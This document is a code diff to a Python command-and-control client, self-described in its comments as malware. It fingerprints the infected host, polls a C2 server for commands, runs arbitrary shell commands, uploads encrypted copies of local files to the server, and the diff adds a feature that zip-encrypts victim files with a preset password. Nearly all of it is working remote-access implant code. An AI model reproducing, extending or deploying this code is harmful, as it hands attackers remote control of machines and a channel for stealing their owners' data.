@@ -15,30 +15,32 @@ from requests import get, exceptions, post, put
 from colorama import Fore
 from time import time, sleep
 from subprocess import run, PIPE, STDOUT
+from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
 from encryption import cipher
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, FILE_REQUEST,
-                      C2_SERVER, DELAY, PORT, PROXY, HEADERS, FILE_SEND)
+                      C2_SERVER, DELAY, PORT, PROXY, HEADERS, FILE_SEND, ZIP_PASSWORD)
 
 # If Client have Windows OS
 if system() == "Windows":
     # For Windows obtain a unique identifying Information
-    client = (getenv("USERNAME","Unknown-Username") + "@" +
-              getenv("COMPUTERNAME","Unknown-Computer Name") + "@" + str(time()))
+    client = (getenv("USERNAME", "Unknown-Username") + "@" +
+              getenv("COMPUTERNAME", "Unknown-Computer Name") + "@" + str(time()))
 
 # Elif Client have Linux OS
 elif system() == "Linux":
     # For Linux, get a unique identifying Information
-    client = getenv("LOGNAME","Unknown-Username") + "@" + uname().nodename + "@" + str(time())
+    client = getenv("LOGNAME", "Unknown-Username") + "@" + uname().nodename + "@" + str(time())
 
 # If OS is not windows or linux, use a Linux version of the client
 else:
-    client = getenv("LOGNAME","Unknown-Username") + "@" + uname().nodename + "@" + str(time())
+    client = getenv("LOGNAME", "Unknown-Username") + "@" + uname().nodename + "@" + str(time())
 
 encryptedClient = cipher.encrypt(client.encode()).decode()
 
 # Print C2 Client Side Message for avoid complexing in test operation
-print(Fore.LIGHTMAGENTA_EX+"[+]-------------C2 Client Side-------------[+]"+Fore.RESET)
+print(Fore.LIGHTMAGENTA_EX + "[+]-------------C2 Client Side-------------[+]" + Fore.RESET)
+
 
 def post_to_server(message: str, response_path=RESPONSE):
     """function to post data to C2 Server, accept message and response path
@@ -49,14 +51,14 @@ def post_to_server(message: str, response_path=RESPONSE):
 
         # Post encoded encrypted message to Server via response_path address
         post(f"http://{C2_SERVER}:{PORT}{response_path}",
-             data={RESPONSE_KEY:message},
+             data={RESPONSE_KEY: message},
              headers=HEADERS, proxies=PROXY)
 
     except exceptions.RequestException:
         return
 
 
-#Better use infinity loop when add control active sessions feature in Server Side
+# Better use infinity loop when add control active sessions feature in Server Side
 while True:
     '''Try an http get requests to the C2 Server and retrieve command;
 	if failed, Keep Trying forever.'''
@@ -68,18 +70,18 @@ while True:
             raise exceptions.RequestException
 
     except exceptions.RequestException:
-        #print(Fore.LIGHTRED_EX+"[-] C2 Server is down, try Reconnecting..."+Fore.RESET)
+        # print(Fore.LIGHTRED_EX+"[-] C2 Server is down, try Reconnecting..."+Fore.RESET)
         try:
             sleep(DELAY)
-            continue #jump to the last iteration of the loop(while True:)
+            continue  # jump to the last iteration of the loop(while True:)
         except KeyboardInterrupt:
-            print(Fore.LIGHTMAGENTA_EX+"\n[*] User has been Interrupted the C2 Client Side"+Fore.RESET)
+            print(Fore.LIGHTMAGENTA_EX + "\n[*] User has been Interrupted the C2 Client Side" + Fore.RESET)
             exit()
     except KeyboardInterrupt:
-        print(Fore.LIGHTMAGENTA_EX+"\n[*] User has been Interrupted the C2 Client Side"+Fore.RESET)
+        print(Fore.LIGHTMAGENTA_EX + "\n[*] User has been Interrupted the C2 Client Side" + Fore.RESET)
         exit()
     except Exception as e:
-        print(Fore.LIGHTYELLOW_EX+"\n[!] Unknown Error when Sending Request to C2 Server"+Fore.RESET)
+        print(Fore.LIGHTYELLOW_EX + "\n[!] Unknown Error when Sending Request to C2 Server" + Fore.RESET)
         print(f'Error Content: {e}')
         exit()
 
@@ -90,7 +92,7 @@ while True:
     if len(command) == 2 and command == "cd":
         homeDirectory = path.expanduser("~")
         chdir(homeDirectory)
-        post_to_server(homeDirectory,CWD_RESPONSE)
+        post_to_server(homeDirectory, CWD_RESPONSE)
 
     # if the Command is cd follow below blocks, first check cd with an input path
     elif command.startswith("cd "):
@@ -110,7 +112,7 @@ while True:
             post_to_server("There was a Operation System Error on client.\n")
         # If not error, send the current directory to the server for using in Prompt
         else:
-            post_to_server(getcwd(),CWD_RESPONSE)
+            post_to_server(getcwd(), CWD_RESPONSE)
 
     # Run command using subprocess.run module
     elif not command.startswith("client "):
@@ -176,10 +178,6 @@ while True:
             # UTF-8 Encode the file to be able to be encrypting it, but then we must decode it after the encryption.
             encryptedFilename = cipher.encrypt(filename.encode()).decode()
 
-            #Test Print
-            print(f"file name is: {filename}")
-            print(f"encrypted file name is: {encryptedFilename}")
-
             # Read the file and use it as data argument for an HTTP PUT Request to our C2 Server
             with open(filepath, "rb") as fileHandle:
                 encryptedFile = cipher.encrypt(fileHandle.read())
@@ -191,10 +189,39 @@ while True:
             post_to_server(f"You must enter the File Name to be downloaded on the client")
 
         # Exception Handling Common Errors maybe occurs
-        except (FileNotFoundError, PermissionError, OSError):
+        except (FileNotFoundError, PermissionError, OSError) as e:
+            print(e)
             post_to_server(f"Unable to write {filename} to disk on the {client}.\n")
 
-# the client Kill Command shutdown our malware
+    elif command.startswith("client zip"):
+        # Initialize filepath to get rid of annoying Pycharm Warning
+        filepath = None
+
+        try:
+            # Split out the filepath from command
+            filepath = command.split()[2]
+
+            # ZIP file using AES Encryption and LZMA compression method
+            with AESZipFile(f"{filepath}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zipFile:
+                zipFile.setpassword(ZIP_PASSWORD)
+
+                # We have functionality to zip-encrypt files, no directory yet
+                if path.isdir(filepath):
+                    post_to_server(f"{filepath} on {client} is a directory. only Files can be zip-encrypted. \n")
+                else:
+                    zipFile.write(filepath)
+                    post_to_server(f"{filepath} is now zip-encrypted on the {client}. \n")
+        except IndexError:
+            post_to_server("You must enter File Path to be zip-encrypted. \n")
+        except FileNotFoundError:
+            post_to_server(f"{filepath} is not found on the {client}.\n")
+        except PermissionError:
+            post_to_server(f"You don't have permission to zip-encrypt {filepath} on the {client}.\n")
+        except OSError:
+            post_to_server(f"Unable to Access {filepath} on the {client}, Operation System Error.\n")
+
+
+    # the client Kill Command shutdown our malware
     elif command.startswith("client kill"):
         post_to_server(f"{client} has been Killed. \n")
         exit()
@@ -220,13 +247,7 @@ while True:
     else:
         post_to_server("Wrong/Unknown Input!!! Not a Built-in Command or Shell Command. try again... \n")
 
-
-
     print("[+] Command Executed and Result send to C2 Server.")
-    print(Fore.LIGHTBLUE_EX+str(response.status_code)+Fore.RESET)
-    
+    print(Fore.LIGHTBLUE_EX + str(response.status_code) + Fore.RESET)
 
-print(Fore.LIGHTCYAN_EX+f"[+] Goodbye & Goodluck Ninja 🥷\n{client}"+Fore.RESET)
-
-
-
+print(Fore.LIGHTCYAN_EX + f"[+] Goodbye & Goodluck Ninja 🥷\n{client}" + Fore.RESET)
